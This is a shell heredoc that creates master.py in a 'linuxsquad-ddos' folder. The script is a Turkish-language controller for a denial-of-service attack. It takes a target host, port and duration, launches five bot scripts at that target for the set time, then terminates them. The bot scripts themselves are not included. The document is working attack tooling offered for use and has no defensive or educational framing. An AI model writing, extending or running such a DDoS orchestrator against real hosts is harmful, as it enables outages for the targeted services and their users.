cd \~/linuxsquad-ddos

cat > master.py << 'EOF'
import subprocess
import time
import sys
import os

os.system("clear")
print("\033[92m╔══════════════════════════════════════════════════════════════════════════════╗")
print("║                 LINUXSQUAD 5 BOT MASTER v5.2 - SIMPLE MODE                   ║")
print("╚══════════════════════════════════════════════════════════════════════════════╝\033[0m")

if len(sys.argv) < 3:
    print("Kullanım: python master.py <HEDEF> <PORT> [SÜRE]")
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])
duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60

print(f"\033[91m[+] Hedef: {target}:{port} | Süre: {duration} saniye\033[0m")
print("\033[93m[+] 5 Bot başlatılıyor...\033[0m\n")

bots = []

for i in range(1, 6):
    print(f"\033[92m[→] Bot{i} başlatılıyor...\033[0m")
    bot = subprocess.Popen(["python3", f"bot{i}.py", target, str(port), str(duration)])
    bots.append(bot)
    time.sleep(1.5)   # Daha uzun ara veriyoruz

print("\n\033[92m[+] Tüm botlar çalıştırıldı. Saldırı aktif...\033[0m")
print(f"\033[93m   {duration} saniye sonra otomatik duracak...\033[0m\n")

try:
    time.sleep(duration + 5)
except KeyboardInterrupt:
    print("\n\033[91m[-] Kullanıcı tarafından durduruldu\033[0m")

for i, bot in enumerate(bots, 1):
    if bot.poll() is None:
        bot.terminate()
        print(f"\033[91m[×] Bot{i} durduruldu\033[0m")

print("\033[92m[+] Master tamamlandı.\033[0m")
EOF
